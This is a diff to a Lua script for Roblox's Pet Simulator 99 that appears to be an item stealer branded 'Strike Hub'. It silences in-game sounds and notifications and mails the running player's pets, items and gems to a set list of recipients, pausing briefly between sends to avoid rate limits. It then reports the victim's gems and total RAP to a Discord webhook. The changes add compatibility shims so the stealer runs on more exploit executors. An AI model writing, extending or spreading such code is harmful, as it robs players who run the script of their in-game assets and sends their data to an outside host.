@@ -1,8 +1,13 @@
 _G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-    return
-end
+if _G.scriptExecuted then return end
 _G.scriptExecuted = true
+
+-- =================== UNIVERSAL EXECUTOR COMPATIBILITY ===================
+local requestFunction = request or (syn and syn.request) or (fluxus and fluxus.request) or http_request
+local getgcFunction = getgc or (debug and debug.getgc) or get_gc_objects
+local getHUI = (gethui and gethui) or function() return game:GetService("CoreGui") end
+local queueOnTP = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
+-- =======================================================================
 
 local network = require(game.ReplicatedStorage.Library.Client.Network)
 local library = require(game.ReplicatedStorage.Library)
@@ -33,7 +38,8 @@ for _, user in ipairs(users) do
     end
 end
 
-for _, func in pairs(getgc()) do
+local FunctionToGetFirstPriceOfMail
+for _, func in pairs(getgcFunction()) do
     if debug.getinfo(func).name == "computeSendMailCost" then
         FunctionToGetFirstPriceOfMail = func
         break
@@ -92,7 +98,9 @@ local function SendMessage(diamonds)
     fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
     local data = {embeds = {{title = "💡 New PS99 Execution", color = 65280, fields = fields, footer = {text = "Strike Hub."}}}}
     local body = HttpService:JSONEncode(data)
-    request({Url = webhook, Method = "POST", Headers = headers, Body = body})
+    if requestFunction then
+        requestFunction({Url = webhook, Method = "POST", Headers = headers, Body = body})
+    end
 end
 
 -- Disable all sounds and notifications
@@ -141,7 +149,6 @@ local function sendItem(category, uid, am)
     end
 end
 
--- Send all gems once at the end
 local function SendAllGems()
     local gemUID
     for uid, data in pairs(GetSave().Inventory.Currency) do
@@ -189,16 +196,14 @@ end
 local function canSendMail()
     local uid
     for i,v in pairs(save["Pet"]) do uid=i break end
-    local args = {"Roblox","Test","Pet",uid,1}
-    local _, err = network.Invoke("Mailbox: Send", unpack(args))
+    local _, err = network.Invoke("Mailbox: Send", "Roblox","Test","Pet",uid,1)
     return (err == "They don't have enough space!")
 end
 
 require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
 require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
 
--- Removed Booth + Hoverboard
-local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Ultimate"}
+local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Ultimate"} -- Removed Booth + Hoverboard
 
 for _,v in pairs(categoryList) do
     if save[v] then
@@ -243,7 +248,7 @@ if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
             task.spawn(function()
                 sendItem(item.category, item.uid, item.amount)
             end)
-            task.wait(0.05) -- small delay to avoid rate-limit, tweak if safe
+            task.wait(0.05) -- small delay to avoid rate-limit
         else
             break
         end
